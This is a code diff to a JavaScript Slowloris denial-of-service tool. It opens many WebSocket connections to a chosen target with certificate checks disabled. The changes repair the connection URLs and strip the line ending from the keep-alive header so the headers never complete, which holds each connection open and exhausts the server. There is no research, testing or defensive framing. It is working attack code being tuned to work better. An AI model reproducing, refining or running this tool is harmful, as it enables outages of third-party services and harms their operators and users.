@@ -28,9 +28,9 @@ function slowloris(target, numSockets) {
         function createSocket(hostname, port, index, isSecure, path) {
             let socket;
             try {
-                const protocol = isSecure ? 'wss://' : 'ws://';
-                socket = new WebSocket(`${protocol}${hostname}:${port}${path}`, {
-                    origin: `${protocol}${hostname}`,
+                const protocol = isSecure ? 'wss:' : 'ws:';
+                socket = new WebSocket(`${protocol}//${hostname}:${port}${path}`, {
+                    origin: `${protocol}//${hostname}`,
                     rejectUnauthorized: false
                 });
 
@@ -54,7 +54,7 @@ function slowloris(target, numSockets) {
                     cleanupSocket(socket, index);
                 });
             } catch (socketError) {
-                console.error(`Error creating socket ${index + 1}:`, socketError.message);
+                console.error(`Error creating socket ${index + 1}:`, socketError);
                 cleanupSocket(socket, index);
             }
         }
@@ -64,17 +64,17 @@ function slowloris(target, numSockets) {
             try {
                 socket.send(initialHeader);
             } catch (error) {
-                console.error("Error sending initial header:", error.message);
+                console.error("Error sending initial header:", error);
                 cleanupSocket(socket);
             }
         }
 
         function sendKeepAliveHeader(socket) {
-            const keepAliveHeader = "X-Custom-Header: keep-alive\r\n\r\n";
+            const keepAliveHeader = "X-Custom-Header: keep-alive\r\n";
             try {
                 socket.send(keepAliveHeader);
             } catch (error) {
-                console.error("Error sending keep-alive header:", error.message);
+                console.error("Error sending keep-alive header:", error);
                 cleanupSocket(socket);
             }
         }
@@ -86,9 +86,9 @@ function slowloris(target, numSockets) {
                 }
             } catch (closeError) {
                 if (index !== undefined) {
-                    console.error(`Error closing socket ${index + 1}:`, closeError.message);
+                    console.error(`Error closing socket ${index + 1}:`, closeError);
                 } else {
-                    console.error("Error closing socket:", closeError.message);
+                    console.error("Error closing socket:", closeError);
                 }
             } finally {
                if(index !== undefined && sockets[index] === socket){
@@ -99,7 +99,7 @@ function slowloris(target, numSockets) {
 
 
     } catch (error) {
-        console.error("Error during Slowloris setup:", error.message);
+        console.error("Error during Slowloris setup:", error);
     }
 }
 
